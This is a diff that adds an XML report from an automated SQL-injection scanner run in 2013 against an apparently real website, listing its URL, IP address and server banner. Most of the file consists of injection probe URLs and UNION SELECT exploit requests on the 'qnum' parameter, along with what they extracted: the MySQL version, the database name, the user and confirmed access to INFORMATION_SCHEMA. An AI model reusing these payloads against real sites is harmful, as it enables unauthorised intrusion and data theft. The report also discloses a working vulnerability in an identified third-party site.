@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<report>
+  <date>June 22, 2013, 7:36 pm</date>
+  <resource>
+    <addrdata>
+      <urladdr>http://www.tests-tests.ru/gulenko.php?qnum=1</urladdr>
+      <ipaddr>77.222.57.95</ipaddr>
+    </addrdata>
+    <serverbanner>Apache/2.0.63-lk.e (Unix) mod_ssl/2.0.63-lk.e OpenSSL/0.9.8d mod_dp/lk.0.20.1 PHP/5.2.9</serverbanner>
+  </resource>
+  <securitylevel>1</securitylevel>
+  <testedvulnerabilities>
+    <vulnerability security_level="1">SQL Injection</vulnerability>
+  </testedvulnerabilities>
+  <scandetails>
+    <sqlinjtestdetails>
+      <possibledb>MySQL</possibledb>
+      <subjects>
+        <subject type="vulnerability">Magic Quotes</subject>
+        <subject type="vulnerability">Numerical Operations (Blind)</subject>
+        <subject type="vulnerability">Grouping Operations</subject>
+        <subject type="exploit">Column Count</subject>
+        <subject type="exploit">Base Info</subject>
+        <subject type="exploit">System DB Check</subject>
+      </subjects>
+      <vulnerableparams>
+        <vulnerableparam>
+          <paramname>qnum</paramname>
+          <vulnerablerequests>
+            <checktechnique technique_name="Magic Quotes">
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1%27</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1%22</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1%27%2F%2A</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1%27+--+</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1%29%2F%2A</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1%29+--</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1%22%2F%2A</request>
+            </checktechnique>
+            <checktechnique technique_name="Numerical Operations (Blind)">
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=2-1</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=0%2B1</request>
+            </checktechnique>
+            <checktechnique technique_name="Grouping Operations">
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1+GROUP+BY+1839</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1+GROUP+BY+1839+--+</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1+ORDER+BY+1839</request>
+              <request>http://www.tests-tests.ru/gulenko.php?qnum=1+ORDER+BY+1839+--+</request>
+            </checktechnique>
+          </vulnerablerequests>
+          <exploits>
+            <exploittechnique technique_name="Column Count">
+              <exploitkind>
+                <resultqueue>http://www.tests-tests.ru/gulenko.php?qnum=1+ORDER+BY+3+--+</resultqueue>
+                <exploitdata>Table column count: 3</exploitdata>
+              </exploitkind>
+            </exploittechnique>
+            <exploittechnique technique_name="Base Info">
+              <exploitkind>
+                <resultqueue>http://www.tests-tests.ru/gulenko.php?qnum=-5551+UNION+SELECT+concat%280x2E2E696E732E696E736F6D6E69612E696E732E2E%2C%40%40version%2C0x2E2E696E732E696E736F6D6E69612E696E732E2E%2Cdatabase%28%29%2C0x2E2E696E732E696E736F6D6E69612E696E732E2E%2Cuser%28%29%2C0x2E2E696E732E696E736F6D6E69612E696E732E2E%29%2C1%2C1+--+</resultqueue>
+                <exploitdata>Base version: 5.0.26-log.
+Current Database: famoru_tests.
+Current User: famoru_tests@localhost.</exploitdata>
+              </exploitkind>
+            </exploittechnique>
+            <exploittechnique technique_name="System DB Check">
+              <exploitkind>
+                <resultqueue>http://www.tests-tests.ru/gulenko.php?qnum=-5551+UNION+SELECT+table_name%2C1%2C1+FROM+INFORMATION_SCHEMA.TABLES+--+</resultqueue>
+                <exploitdata>The System Database is accessible.</exploitdata>
+              </exploitkind>
+            </exploittechnique>
+          </exploits>
+        </vulnerableparam>
+      </vulnerableparams>
+    </sqlinjtestdetails>
+  </scandetails>
+</report>
